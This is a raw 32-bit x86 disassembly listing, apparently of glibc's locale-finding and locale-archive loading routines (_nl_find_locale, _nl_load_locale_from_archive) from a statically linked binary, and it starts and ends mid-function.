mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x805df47
mov eax, dword [var_24h]
test eax, eax
jne 0x805dc44
mov eax, dword [var_2ch_2]
mov edx, ebx
call fcn.0805e490
test eax, eax
mov edx, eax
je 0x805dc36
lea esp, [var_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret 4
mov dword [var_24h_2], str._usr_lib_locale
mov dword [var_28h_2], 0x10
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08061480
test eax, eax
mov esi, eax
je 0x805df40
mov dword [esp], esi
call fcn.08053400
lea edx, [eax + 1]
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_3bh]
mov dword [var_8h], edx
mov dword [var_4h], esi
and eax, 0xfffffff0
mov dword [esp], eax
call fcn.08053770
mov esi, eax
lea eax, [var_10h]
mov dword [var_14h], eax
mov dword [esp], esi
lea eax, [var_bp_14h]
mov dword [var_sp_10h], eax
lea eax, [var_18h]
mov dword [var_sp_ch], eax
lea eax, [var_1ch]
mov dword [var_8h], eax
lea eax, [var_20h]
mov dword [var_4h], eax
call fcn.08062200
mov edx, dword [var_2ch]
mov ebx, eax
mov dword [var_sp_28h], 0
mov eax, dword [var_1ch]
mov dword [var_sp_ch], ebx
mov edx, dword [edx*4 + 0x8093ea0]
mov dword [var_sp_20h], eax
mov eax, dword [var_10h]
mov dword [var_30h], edx
mov dword [var_sp_24h], edx
mov edx, dword [var_24h]
mov dword [var_sp_1ch], eax
mov eax, dword [var_bp_14h]
mov dword [var_4h], edx
mov dword [var_sp_18h], eax
mov eax, dword [var_18h]
mov dword [var_14h], eax
mov eax, dword [var_20h]
mov dword [var_sp_10h], eax
mov eax, dword [var_28h]
mov dword [var_8h], eax
mov eax, dword [var_2ch]
lea esi, [eax*4 + 0x80aace0]
mov dword [esp], esi
call fcn.08061b40
test eax, eax
mov edi, eax
je 0x805dee0
and ebx, 1
jne 0x805ded0
mov eax, dword [edi + 4]
test eax, eax
je 0x805dec1
mov ebx, dword [edi + 8]
test ebx, ebx
jne 0x805dd72
mov eax, dword [edi + 0x10]
xor ebx, ebx
test eax, eax
je 0x805deb9
mov esi, dword [eax + 4]
test esi, esi
je 0x805dea8
mov ecx, dword [eax + 8]
test ecx, ecx
jne 0x805dd5e
inc ebx
mov eax, dword [edi + ebx*4 + 0x10]
test eax, eax
jne 0x805dd43
mov dword [edi + 0x10], eax
xor edx, edx
mov edi, dword [edi + ebx*4 + 0x10]
test edi, edi
je 0x805dc2a
mov ebx, dword [edi + 8]
mov edx, dword [var_bp_14h]
test edx, edx
je 0x805de2e
mov edx, dword [var_2ch]
mov eax, dword [edx*4 + 0x8093f80]
mov ebx, dword [ebx + eax*4 + 0x24]
test ebx, ebx
je 0x805dfcd
mov dword [esp], ebx
call fcn.08053400
add eax, 0x15
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_3bh]
mov dword [var_4h], ebx
and eax, 0xfffffff0
mov dword [esp], eax
mov dword [var_34h], eax
call fcn.0805db00
mov ebx, dword [ebp - 0x14]
mov dword [esp], ebx
call fcn.08053400
add eax, 0x15
and eax, 0xfffffffc
sub esp, eax
lea edx, [var_3bh]
mov dword [var_4h], ebx
and edx, 0xfffffff0
mov dword [var_38h], edx
mov dword [esp], edx
call fcn.0805db00
mov esi, dword [var_34h]
mov ebx, esi
movsx edx, byte [esi]
mov eax, dword [0x80a99fc]
mov ecx, ebx
inc esi
inc ebx
mov eax, dword [eax + edx*4]
test al, al
mov byte [ecx], al
jne 0x805dde7
mov esi, dword [var_38h]
mov ebx, esi
movsx edx, byte [esi]
mov eax, dword [0x80a99fc]
mov ecx, ebx
inc esi
inc ebx
mov eax, dword [eax + edx*4]
test al, al
mov byte [ecx], al
jne 0x805de01
mov edx, dword [var_34h]
mov eax, dword [var_38h]
call fcn.08056ec0
xor edx, edx
test eax, eax
jne 0x805dc2a
mov ebx, dword [edi + 8]
mov eax, dword [ebx]
test eax, eax
jne 0x805de6a
mov dword [var_4h], 0x2f
mov eax, dword [edi]
mov dword [esp], eax
call fcn.08077060
lea edx, [eax - 1]
cmp byte [edx - 1], 0x2f
je 0x805de57
nop
dec edx
cmp byte [edx - 1], 0x2f
jne 0x805de50
mov ebx, dword [edi + 8]
sub eax, edx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08076ed0
mov dword [ebx], eax
mov eax, dword [var_1ch]
test eax, eax
je 0x805dea3
mov dword [var_4h], 0x8092de3
mov dword [esp], eax
call fcn.08077440
test eax, eax
jne 0x805dea3
mov ebx, dword [edi + 8]
mov dword [ebx + 0x1c], 1
nop
mov eax, dword [ebx + 0x18]
cmp eax, 0xfffffffd
ja 0x805de9c
inc eax
mov dword [ebx + 0x18], eax
mov edx, ebx
jmp 0x805dc2a
mov ebx, dword [edi + 8]
jmp 0x805de90
mov edx, dword [var_2ch_2]
call fcn.0805e160
mov eax, dword [edi + ebx*4 + 0x10]
jmp 0x805dd4e
mov eax, dword [edi + 0x10]
jmp 0x805dd5e
mov edx, dword [var_2ch]
mov eax, edi
call fcn.0805e160
jmp 0x805dd2f
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08051180
jmp 0x805dd24
mov eax, dword [var_1ch]
mov edx, dword [var_30h]
mov dword [var_sp_28h], 1
mov dword [var_sp_ch], ebx
mov dword [esp], esi
mov dword [var_sp_20h], eax
mov dword [var_sp_24h], edx
mov eax, dword [var_10h]
mov edx, dword [var_24h]
mov dword [var_sp_1ch], eax
mov eax, dword [var_bp_14h]
mov dword [var_4h], edx
mov dword [var_sp_18h], eax
mov eax, dword [var_18h]
mov dword [var_14h], eax
mov eax, dword [var_20h]
mov dword [var_sp_10h], eax
mov eax, dword [var_28h]
mov dword [var_8h], eax
call fcn.08061b40
xor edx, edx
test eax, eax
mov edi, eax
jne 0x805dd1b
jmp 0x805dc2a
lea esi, [esi]
mov esi, dword [ebx]
jmp 0x805dc58
mov eax, dword [var_2ch]
mov dword [ebx], 0x80a0139
mov edx, dword [eax*4 + 0x80a99c0]
jmp 0x805dc2a
mov dword [var_4h], 0x2f
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
je 0x805dbdf
mov dword [ebx], 0x80a0139
jmp 0x805dbdf
nop
mov dword [esp], str.LC_ALL
call fcn.080631c0
test eax, eax
mov dword [ebx], eax
je 0x805df97
cmp byte [eax], 0
jne 0x805dfab
mov edx, dword [var_2ch]
mov eax, dword [edx*4 + 0x8093ea0]
mov dword [esp], eax
call fcn.080631c0
mov dword [ebx], eax
mov eax, dword [ebx]
test eax, eax
je 0x805dfba
cmp byte [eax], 0
jne 0x805dbc0
mov dword [esp], str.LANG
call fcn.080631c0
mov dword [ebx], eax
jmp 0x805dbc0
mov dword [var_sp_ch], str._nl_find_locale
mov dword [var_8h], 0xde
mov dword [var_4h], str.findlocale.c
mov dword [esp], str.locale_codeset_____void__0_
call fcn.0805efc0
jmp 0x805e000
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ecx, eax
mov eax, dword [edx + 0x18]
mov ebp, esp
dec eax
test eax, eax
mov dword [edx + 0x18], eax
jne 0x805e040
cmp dword [edx + 0xc], 2
je 0x805e038
mov eax, dword [ecx*4 + 0x80aace0]
cmp dword [eax + 8], edx
je 0x805e02a
mov eax, dword [eax + 0xc]
cmp dword [eax + 8], edx
jne 0x805e022
mov dword [eax + 4], 0
mov dword [eax + 8], 0
mov eax, edx
leave
jmp fcn.0805e410
leave
ret
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
xor ebx, ebx
sub esp, 0x14
mov dword [var_14h], 1
mov dword [var_10h], 0
nop
lea esi, [esi]
cmp ebx, 6
je 0x805d480
cmp dword [arg_8h], 6
je 0x805d580
cmp dword [arg_8h], ebx
je 0x805d572
mov esi, dword [ebx*4 + 0x80a9a80]
mov dword [esp], esi
call fcn.08053400
mov dword [var_10h], eax
add eax, dword [ebx*4 + str._b_n_a_n_v_v]
test ebx, ebx
lea edi, [eax + edi + 2]
jle 0x805d480
mov edx, dword [var_14h]
test edx, edx
je 0x805d480
mov edx, dword [arg_ch]
mov eax, dword [edx]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08076e50
test eax, eax
mov eax, 0
cmove eax, dword [var_14h]
mov dword [var_14h], eax
nop
inc ebx
cmp ebx, 0xc
jle 0x805d420
mov eax, dword [var_14h]
test eax, eax
je 0x805d4f7
mov edx, dword [arg_ch]
mov dword [var_4h], 0x80a0139
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x805d4bf
mov edx, dword [arg_ch]
mov dword [var_4h], str.POSIX
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
jne 0x805d4cc
mov eax, 0x80a0139
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
mov ebx, dword [var_10h]
inc ebx
mov dword [esp], ebx
call fcn.08050fe0
mov edi, eax
xor eax, eax
test edi, edi
je 0x805d4c4
mov edx, dword [arg_ch]
mov eax, dword [edx]
mov dword [esp], edi
mov dword [var_8h], ebx
mov dword [var_4h], eax
call fcn.08053770
jmp 0x805d4c4
mov dword [esp], edi
call fcn.08050fe0
mov edi, eax
xor eax, eax
test edi, edi
je 0x805d4c4
mov edx, edi
xor ebx, ebx
nop
lea esi, [esi]
cmp ebx, 6
je 0x805d552
cmp dword [arg_8h], 6
je 0x805d56a
cmp dword [arg_8h], ebx
je 0x805d563
mov esi, dword [ebx*4 + 0x80a9a80]
mov eax, dword [ebx*4 + 0x8093ea0]
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.080773c0
mov edx, eax
mov byte [eax], 0x3d
mov dword [var_4h], esi
inc edx
mov dword [esp], edx
call fcn.080773c0
mov edx, eax
mov byte [eax], 0x3b
inc edx
inc ebx
cmp ebx, 0xc
jle 0x805d510
mov byte [edx - 1], 0
mov eax, edi
jmp 0x805d4c4
mov eax, dword [arg_ch]
mov esi, dword [eax]
jmp 0x805d527
mov eax, dword [arg_ch]
mov esi, dword [eax + ebx*4]
jmp 0x805d527
mov edx, dword [arg_ch]
mov esi, dword [edx]
jmp 0x805d43f
lea esi, [esi]
mov eax, dword [arg_ch]
mov esi, dword [eax + ebx*4]
jmp 0x805d43f
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 4
mov edi, dword [arg_10h]
mov ebx, dword [arg_8h]
mov dword [esp], ebx
call fcn.08053400
lea esi, [eax + 1]
cmp esi, 1
ja 0x8077540
mov eax, dword [arg_14h]
mov dword [edi], 0
mov dword [eax], 0
xor edx, edx
add esp, 4
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
lea esi, [esi]
mov dword [esp], esi
call fcn.08050fe0
mov edx, 0xc
test eax, eax
mov dword [edi], eax
je 0x8077530
mov ecx, eax
movzx edx, byte [ebx]
movsx eax, dl
cmp eax, dword [arg_ch]
je 0x807758e
mov byte [ecx], dl
inc ecx
inc ebx
test dl, dl
jne 0x8077555
test esi, esi
je 0x8077573
mov eax, dword [arg_14h]
mov dword [eax], esi
jmp 0x807752e
mov eax, dword [edi]
mov dword [esp], eax
call fcn.08051180
mov eax, dword [arg_14h]
mov dword [edi], 0
mov dword [eax], 0
jmp 0x807756c
cmp ecx, dword [edi]
jbe 0x807759d
cmp byte [ecx - 1], 0
je 0x807759d
mov byte [ecx], 0
jmp 0x8077562
dec esi
jmp 0x8077563
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov ebx, dword [arg_10h]
mov edi, dword [arg_8h]
mov dword [esp], ebx
call fcn.08053400
lea esi, [eax + 1]
cmp esi, 1
ja 0x807762b
xor edx, edx
add esp, 0xc
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [arg_ch]
mov eax, dword [edx]
add eax, esi
mov dword [var_4h], eax
mov eax, dword [edi]
mov dword [esp], eax
call fcn.08051220
mov edx, 0xc
test eax, eax
mov dword [edi], eax
je 0x8077621
mov edx, dword [arg_ch]
mov edx, dword [edx]
mov dword [var_10h], edx
lea ecx, [edx + eax]
movzx edx, byte [ebx]
movsx eax, dl
cmp eax, dword [arg_14h]
je 0x8077675
mov byte [ecx], dl
inc ecx
inc ebx
test dl, dl
jne 0x8077656
mov eax, dword [var_10h]
mov edx, dword [arg_ch]
add eax, esi
mov dword [edx], eax
jmp 0x807761f
cmp ecx, dword [edi]
jbe 0x8077684
cmp byte [ecx - 1], 0
je 0x8077684
mov byte [ecx], 0
jmp 0x8077663
dec esi
jmp 0x8077664
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x204
mov dword [var_1a4h], edx
mov dword [var_1a0h], eax
mov eax, dword [edx]
mov dword [esp], 0x1e
mov dword [var_1a8h], eax
call fcn.08078cd0
mov esi, dword [0x80aa920]
mov dword [var_1bch], eax
mov dword [var_1c0h], 0xffffffff
test esi, esi
je 0x805e505
mov ebx, dword [esi + 4]
cmp dword [var_1a8h], ebx
je 0x805ee82
mov edx, dword [var_1a8h]
mov dword [var_4h], ebx
mov dword [esp], edx
call fcn.08076e50
test eax, eax
je 0x805ee82
mov esi, dword [esi]
test esi, esi
jne 0x805e4d6
mov esi, dword [var_1a8h]
mov dword [var_4h], 0x2e
mov dword [esp], esi
call fcn.08076ce0
test eax, eax
mov esi, eax
je 0x805e531
movzx eax, byte [eax + 1]
cmp al, 0x40
je 0x805e531
test al, al
jne 0x805ed84
mov eax, dword [0x80aa8a0]
test eax, eax
jne 0x805e680
mov dword [0x80aa8a0], 0x80aa8a4
mov ebx, str._usr_lib_locale_locale_archive
mov ecx, 0x8000
mov eax, 5
int 0x80
cmp eax, 0xfffff000
mov dword [var_1d0h], eax
ja 0x805ed62
mov ecx, dword [var_1d0h]
xor eax, eax
test ecx, ecx
mov dword [var_1c0h], ecx
js 0x805e97d
mov ebx, dword [var_1c0h]
mov dword [var_8h], 0x80aa8c0
mov dword [esp], 3
mov dword [var_4h], ebx
call fcn.08053dc0
inc eax
je 0x805eb9d
mov edi, dword [0x80aa8f0]
mov esi, dword [0x80aa8ec]
test edi, edi
jl 0x805e5c0
jle 0x805ed51
mov esi, 0x200000
mov eax, dword [var_1d0h]
mov dword [var_1cch], esi
mov dword [var_14h], 0
mov dword [var_18h], 0
mov dword [var_sp_ch], 2
mov dword [var_8h], 1
mov dword [var_4h], esi
mov dword [esp], 0
mov dword [var_10h], eax
call fcn.080546f0
cmp eax, 0xffffffff
mov ecx, eax
je 0x805eb9d
imul ebx, dword [ecx + 0x24], 0x6c
mov eax, dword [eax + 0x10]
mov edx, dword [ecx + 8]
lea eax, [eax + eax*2]
lea eax, [edx + eax*4]
add ebx, dword [ecx + 0x20]
mov edx, dword [ecx + 0x18]
add edx, dword [ecx + 0x14]
cmp ebx, edx
cmovl ebx, edx
cmp ebx, eax
cmovl ebx, eax
cmp ebx, dword [var_1cch]
ja 0x805ecc6
mov edx, dword [0x80aa8f0]
xor esi, esi
mov ebx, dword [var_1cch]
mov eax, dword [0x80aa8ec]
cmp esi, edx
jl 0x805e66e
jg 0x805e657
cmp ebx, eax
jb 0x805e66e
mov ebx, dword [var_1d0h]
mov eax, 6
int 0x80
mov dword [var_1c0h], 0xffffffff
mov esi, dword [var_1cch]
mov dword [0x80aa8a4], ecx
mov dword [0x80aa8ac], esi
mov eax, dword [0x80aa8a4]
test eax, eax
mov dword [var_1d4h], eax
je 0x805eb9d
mov edx, dword [var_1a8h]
mov dword [esp], edx
call fcn.08053400
xor ecx, ecx
cmp ecx, eax
mov ebx, eax
mov edx, eax
jae 0x805e6c4
nop
lea esi, [esi]
mov esi, dword [var_1a8h]
rol edx, 9
movsx eax, byte [ecx + esi]
inc ecx
add edx, eax
cmp ecx, ebx
jb 0x805e6b0
test edx, edx
mov edi, edx
mov eax, 0xffffffff
cmove edi, eax
mov esi, dword [var_1d4h]
xor edx, edx
mov eax, dword [var_1d4h]
add esi, dword [esi + 8]
mov ecx, dword [eax + 0x10]
mov eax, edi
div ecx
lea eax, [ecx - 2]
mov dword [var_1f4h], eax
mov eax, edi
mov ebx, edx
xor edx, edx
div dword [var_1f4h]
inc edx
mov dword [var_1b4h], edx
lea eax, [ebx + ebx*2]
shl eax, 2
mov edx, dword [esi + eax + 4]
test edx, edx
je 0x805eb9d
cmp dword [esi + eax], edi
je 0x805e729
add ebx, dword [var_1b4h]
cmp ebx, ecx
jb 0x805e704
sub ebx, ecx
jmp 0x805e704
mov eax, dword [var_1d4h]
mov ecx, dword [var_1a8h]
add eax, edx
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.08076e50
test eax, eax
je 0x805e752
mov eax, dword [var_1d4h]
mov ecx, dword [eax + 0x10]
jmp 0x805e71b
lea eax, [ebx + ebx*2]
mov eax, dword [esi + eax*4 + 8]
test eax, eax
je 0x805eb9d
mov ecx, dword [var_1d4h]
add ecx, eax
mov dword [var_1b8h], 0
xor edi, edi
lea edx, [var_ch]
cmp edi, 6
je 0x805e7aa
mov eax, dword [ecx + edi*8 + 4]
mov dword [edx - 0x124], 0
inc dword [var_1b8h]
mov dword [edx - 0x130], eax
mov eax, dword [ecx + edi*8 + 8]
mov dword [edx - 0x128], edi
mov dword [edx - 0x12c], eax
add edx, 0x10
inc edi
cmp edi, 0xc
jle 0x805e778
mov edx, dword [var_1b8h]
lea eax, [var_13ch]
mov dword [var_sp_ch], fcn.0805e480
mov dword [var_8h], 0x10
mov dword [esp], eax
xor edi, edi
mov dword [var_4h], edx
call fcn.08063070
cmp edi, dword [var_1b8h]
mov ecx, dword [0x80aa8a0]
mov dword [var_1b0h], ecx
mov dword [var_1ach], ecx
jge 0x805e8e0
lea ebx, [var_ch]
mov dword [var_1e8h], ebx
mov esi, dword [var_1ach]
test esi, esi
je 0x805e991
mov esi, dword [var_1ach]
mov ecx, dword [var_1e8h]
mov eax, dword [esi + 8]
mov edx, dword [ecx - 0x12c]
add eax, dword [esi + 4]
add edx, dword [ecx - 0x130]
cmp eax, edx
ja 0x805e858
mov ebx, dword [var_1ach]
mov esi, dword [ebx + 0xc]
mov dword [var_1b0h], ebx
test esi, esi
mov dword [var_1ach], esi
je 0x805e991
mov eax, dword [esi + 8]
add eax, dword [esi + 4]
cmp eax, edx
jbe 0x805e831
mov ebx, dword [var_1ach]
test ebx, ebx
je 0x805e991
mov eax, dword [var_1ach]
mov edx, dword [var_1e8h]
mov esi, dword [var_1e8h]
mov ebx, dword [eax + 4]
mov ecx, dword [edx - 0x130]
sub esi, 0x130
cmp ebx, ecx
ja 0x805e991
mov eax, dword [esi + 4]
mov edx, dword [var_1ach]
mov dword [var_1e4h], eax
add eax, ecx
mov dword [var_1f4h], eax
mov eax, dword [edx + 8]
add eax, ebx
cmp dword [var_1f4h], eax
ja 0x805e991
add ecx, dword [edx]
mov eax, dword [esi + 8]
mov edx, dword [var_1e4h]
sub ecx, ebx
mov dword [ebp + eax*8 - 0x78], edx
mov dword [ebp + eax*8 - 0x7c], ecx
inc edi
add dword [var_1e8h], 0x10
cmp edi, dword [var_1b8h]
jl 0x805e801
mov eax, dword [var_1c0h]
test eax, eax
js 0x805e8f7
mov ebx, dword [var_1c0h]
mov eax, 6
int 0x80
mov dword [esp], 0x3c
call fcn.08050fe0
mov esi, eax
xor eax, eax
test esi, esi
je 0x805e97d
mov edx, dword [var_1a4h]
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08076e80
test eax, eax
mov dword [esi + 4], eax
je 0x805e985
mov eax, dword [0x80aa920]
xor edi, edi
mov dword [esi], eax
mov dword [0x80aa920], esi
cmp edi, 6
je 0x805e962
mov edx, dword [ebp + edi*8 - 0x7c]
mov ecx, dword [ebp + edi*8 - 0x78]
mov eax, edi
call fcn.0805e080
test eax, eax
mov edx, eax
mov dword [esi + edi*4 + 8], eax
je 0x805e962
mov dword [eax + 0xc], 2
mov dword [edx + 0x18], 0xffffffff
mov eax, dword [esi + 4]
mov dword [edx], eax
inc edi
cmp edi, 0xc
jle 0x805e931
mov eax, dword [esi + 4]
mov ecx, dword [var_1a4h]
mov dword [ecx], eax
mov ebx, dword [var_1a0h]
mov eax, dword [esi + ebx*4 + 8]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], esi
call fcn.08051180
xor eax, eax
jmp 0x805e97d
mov eax, dword [var_1bch]
dec eax
test dword [var_1bch], eax
jne 0x805eca2
mov ecx, dword [var_1e8h]
not eax
lea esi, [var_ch]
mov dword [var_1f0h], eax
mov dword [var_1d8h], edi
mov ebx, dword [ecx - 0x130]
and ebx, eax
mov eax, edi
shl eax, 4
mov dword [var_1dch], ebx
mov ebx, dword [0x80aa8ec]
lea edx, [esi + eax]
mov eax, dword [edx - 0x130]
mov ecx, dword [edx - 0x12c]
add ecx, eax
cmp ecx, ebx
mov dword [var_1e0h], ecx
ja 0x805eb9d
mov esi, dword [var_1bch]
lea ecx, [esi + ecx - 1]
mov esi, dword [var_1f0h]
and ecx, esi
mov dword [var_1e0h], ecx
mov ecx, dword [var_1ach]
test ecx, ecx
je 0x805ea20
mov ecx, dword [var_1ach]
cmp eax, dword [ecx + 4]
jae 0x805ea4b
inc dword [var_1d8h]
add edx, 0x10
mov esi, dword [var_1b8h]
cmp dword [var_1d8h], esi
jge 0x805ea4b
mov eax, dword [var_1e0h]
add eax, dword [var_1bch]
cmp dword [edx - 0x130], eax
jb 0x805e9d7
cmp dword [var_1c0h], 0xffffffff
je 0x805ebbd
mov ecx, dword [var_1dch]
mov esi, dword [var_1e0h]
mov dword [var_18h], 0
mov ebx, dword [var_1c0h]
mov dword [var_sp_ch], 2
mov dword [var_8h], 1
mov dword [esp], 0
sub esi, ecx
mov dword [var_14h], ecx
mov dword [var_10h], ebx
mov dword [var_4h], esi
call fcn.080546f0
cmp eax, 0xffffffff
mov ebx, eax
je 0x805eb9d
mov dword [esp], 0x10
call fcn.08050fe0
test eax, eax
je 0x805eb91
mov ecx, dword [var_1b0h]
mov dword [eax + 8], esi
mov edx, dword [var_1dch]
mov esi, dword [var_1ach]
mov dword [eax], ebx
cmp dword [ecx + 0xc], esi
mov dword [eax + 4], edx
jne 0x805eb70
mov ecx, dword [var_1b0h]
mov edx, dword [var_1ach]
lea esi, [var_ch]
mov dword [var_1b0h], eax
mov dword [eax + 0xc], edx
mov dword [ecx + 0xc], eax
mov eax, edi
shl eax, 4
lea ecx, [esi + eax]
mov edx, dword [ecx - 0x130]
cmp edx, dword [var_1dch]
jb 0x805eb4c
lea edx, [edx + ebx]
mov eax, dword [ecx - 0x128]
inc edi
sub edx, dword [var_1dch]
add dword [var_1e8h], 0x10
mov dword [ebp + eax*8 - 0x7c], edx
mov edx, dword [ecx - 0x12c]
add ecx, 0x10
cmp edi, dword [var_1d8h]
mov dword [ebp + eax*8 - 0x78], edx
jl 0x805eb01
dec edi
sub dword [var_1e8h], 0x10
jmp 0x805e8cc
mov dword [var_sp_ch], str._nl_load_locale_from_archive
mov dword [var_8h], 0x1b6
mov dword [var_4h], str.loadarchive.c
mov dword [esp], str.ranges_cnt_.from___from
call fcn.0805efc0
mov dword [var_sp_ch], str._nl_load_locale_from_archive
mov dword [var_8h], 0x1ae
mov dword [var_4h], str.loadarchive.c
mov dword [esp], str.last__next__mapped
jmp 0x805eb6b
mov dword [var_4h], esi
mov dword [esp], ebx
call fcn.08054780
mov edi, dword [var_1c0h]
test edi, edi
js 0x805e98d
mov ebx, dword [var_1c0h]
mov eax, 6
int 0x80
jmp 0x805e98d
mov ebx, str._usr_lib_locale_locale_archive
mov ecx, 0x8000
mov eax, 5
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x805ec8f
xor eax, eax
mov dword [var_1c0h], ebx
cmp ebx, 0xffffffff
je 0x805e97d
lea eax, [var_19ch]
mov dword [var_4h], ebx
mov dword [esp], 3
mov dword [var_8h], eax
call fcn.08053dc0
test eax, eax
js 0x805eb9d
mov ebx, dword [var_16ch]
mov ecx, dword [var_170h]
mov eax, dword [0x80aa8ec]
mov edx, dword [0x80aa8f0]
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
jne 0x805eb9d
mov eax, dword [0x80aa908]
cmp dword [var_154h], eax
jne 0x805eb9d
mov ebx, dword [var_198h]
mov ecx, dword [var_19ch]
mov eax, dword [0x80aa8c0]
mov edx, dword [0x80aa8c4]
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
jne 0x805eb9d
mov ebx, dword [var_140h]
mov ecx, dword [var_144h]
mov eax, dword [0x80aa918]
mov edx, dword [0x80aa91c]
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
je 0x805ea58
jmp 0x805eb9d
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x805ebdb
mov dword [var_sp_ch], str._nl_load_locale_from_archive
mov dword [var_8h], 0x175
mov dword [var_4h], str.loadarchive.c
mov dword [esp], str.____ps____1____ps____0_
jmp 0x805eb6b
mov dword [var_4h], esi
mov dword [esp], ecx
xor edi, edi
call fcn.08054780
mov edx, dword [0x80aa8f0]
mov eax, dword [0x80aa8ec]
cmp edi, edx
jl 0x805ecf1
jg 0x805eb9d
cmp ebx, eax
ja 0x805eb9d
mov edx, dword [var_1bch]
mov ecx, dword [var_1d0h]
mov dword [var_14h], 0
mov dword [var_18h], 0
mov dword [var_sp_ch], 2
mov dword [var_8h], 1
mov dword [esp], 0
mov eax, edx
lea ebx, [edx + ebx - 1]
mov dword [var_10h], ecx
neg eax
and ebx, eax
mov dword [var_1cch], ebx
mov dword [var_4h], ebx
call fcn.080546f0
cmp eax, 0xffffffff
mov ecx, eax
jne 0x805e63a
jmp 0x805eb9d
cmp esi, 0x200000
jbe 0x805e5c0
jmp 0x805e5bb
call fcn.08048b20
neg dword [var_1d0h]
mov edx, dword [var_1d0h]
mov dword [var_1d0h], 0xffffffff
mov dword [eax], edx
jmp 0x805e56a
inc esi
mov dword [var_4h], 0x40
mov dword [esp], esi
call fcn.08053870
mov dword [esp], esi
mov ebx, eax
mov dword [var_1c4h], eax
sub ebx, esi
mov dword [var_4h], ebx
call fcn.08061f40
mov dword [var_1c8h], eax
mov edx, dword [var_1c8h]
xor eax, eax
test edx, edx
je 0x805e97d
mov eax, dword [var_1c8h]
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08076fc0
test eax, eax
jne 0x805edeb
mov edx, dword [var_1c8h]
cmp byte [ebx + edx], 0
je 0x805e531
mov ecx, dword [var_1c8h]
mov dword [esp], ecx
call fcn.08053400
mov ebx, dword [var_1c4h]
mov edi, eax
mov dword [esp], ebx
call fcn.08053400
mov edx, esi
sub edx, dword [var_1a8h]
mov ebx, eax
inc ebx
lea eax, [edi + edx]
lea eax, [ebx + eax + 0x12]
and eax, 0xfffffffc
sub esp, eax
mov eax, dword [var_1a8h]
lea esi, [var_2bh]
mov dword [var_8h], edx
and esi, 0xfffffff0
mov dword [var_4h], eax
mov dword [esp], esi
call fcn.08053740
mov edx, dword [var_1c8h]
mov dword [esp], eax
mov dword [var_8h], edi
mov dword [var_4h], edx
call fcn.08053740
mov ecx, dword [var_1c4h]
mov dword [var_8h], ebx
mov dword [esp], eax
mov dword [var_4h], ecx
call fcn.08053770
mov ebx, dword [var_1c8h]
mov dword [esp], ebx
call fcn.08051180
mov dword [var_1a8h], esi
jmp 0x805e531
mov ecx, dword [var_1a4h]
mov dword [ecx], ebx
jmp 0x805e973
push ebp
mov eax, 0
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x20
test eax, eax
mov dword [var_18h], 0
mov edi, dword [arg_8h]
je 0x80614a8
mov dword [esp], 0x80aa950
call section.
mov edx, dword [0x80aa970]
xor eax, eax
mov dword [var_14h], edi
test edx, edx
jne 0x8061561
test eax, eax
jne 0x8061559
mov ecx, dword [0x80a9b00]
xor esi, esi
cmp byte [ecx], 0
je 0x806150c
cmp byte [ecx], 0x3a
je 0x8061540
movzx eax, byte [ecx]
mov ebx, ecx
test al, al
je 0x80614f7
cmp al, 0x3a
je 0x80614f7
mov eax, ecx
inc ecx
mov dword [0x80a9b00], ecx
movzx eax, byte [eax + 1]
test al, al
je 0x80614f7
cmp al, 0x3a
jne 0x80614e2
cmp ebx, ecx
jb 0x806152c
test esi, esi
jne 0x80614a8
mov edx, dword [0x80a9b00]
cmp byte [edx], 0
mov ecx, edx
jne 0x80614d0
mov eax, 0
test eax, eax
je 0x8061521
mov dword [esp], 0x80aa950
call section.
mov eax, dword [var_18h]
add esp, 0x20
pop ebx
pop esi
pop edi
leave
ret
sub ecx, ebx
mov eax, ebx
mov edx, ecx
call fcn.08061590
mov esi, eax
jmp 0x80614fb
nop
lea esi, [esi]
lea edx, [ecx + 1]
mov dword [0x80a9b00], edx
mov ecx, edx
lea edx, [edx + 1]
cmp byte [edx - 1], 0x3a
je 0x8061543
jmp 0x80614d5
mov eax, dword [eax + 4]
mov dword [var_18h], eax
jmp 0x806150c
mov eax, dword [0x80aad90]
mov dword [var_10h], fcn.08061b10
mov dword [var_ch], 8
mov dword [var_8h], edx
mov dword [var_4h], eax
lea eax, [var_14h]
mov dword [esp], eax
call fcn.08062e40
jmp 0x80614bb
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 8
mov ecx, dword [arg_14h]
mov edx, dword [arg_10h]
mov eax, dword [arg_8h]
mov ebx, dword [arg_ch]
mov dword [edx], 0
mov edx, dword [arg_18h]
mov dword [ecx], 0
mov ecx, dword [arg_1ch]
mov dword [edx], 0
mov dword [ecx], 0
mov dword [ebx], eax
mov dword [esp], eax
call fcn.080621c0
cmp dword [ebx], eax
mov esi, eax
je 0x806235a
movzx eax, byte [eax]
